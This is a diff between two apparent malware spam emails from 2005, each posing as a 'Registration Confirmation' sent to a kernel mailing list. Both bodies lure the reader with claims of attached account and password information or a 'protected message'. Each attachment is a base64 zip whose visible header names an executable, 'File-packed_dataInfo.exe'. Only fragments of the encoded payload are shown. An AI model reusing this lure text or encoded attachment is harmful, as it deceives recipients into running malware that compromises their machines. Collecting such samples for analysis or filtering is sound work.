@@ -1,9 +1,9 @@
-From: Admin@zf-lenksysteme.com
+From: hostmaster@radiks.net
 Subject: Registration Confirmation
-Date: Thu, 08 Dec 2005 06:39:51 UTC
-Message-ID: <59b35fd.bf0afdb3f1a9@ujxwoisnj.com>
+Date: Thu, 08 Dec 2005 06:55:26 GMT
+Message-ID: <a1462.8a1f3bd6204f4@radiks.net>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="======cdfa6fcbccb18c.b2eb07f"
+Content-Type: multipart/mixed; boundary="==354aac3c.a06ecccfab8"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
 To: majordomo@oss.sgi.com
@@ -13,17 +13,17 @@ List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---======cdfa6fcbccb18c.b2eb07f
+--==354aac3c.a06ecccfab8
 
-Account and Password Information are attached!
+Protected message is attached!
 
 
-***** Go to: http://www.zf-lenksysteme.com
-***** Email: postman@zf-lenksysteme.com
---======cdfa6fcbccb18c.b2eb07f
-Content-Type: application/octet-stream; name=reg_pass-data.zip
+***** Go to: http://www.radiks.net
+***** Email: postman@radiks.net
+--==354aac3c.a06ecccfab8
+Content-Type: application/octet-stream; name=reg_pass.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass-data.zip"
+Content-Disposition: attachment; filename="reg_pass.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---======cdfa6fcbccb18c.b2eb07f--
+--==354aac3c.a06ecccfab8--
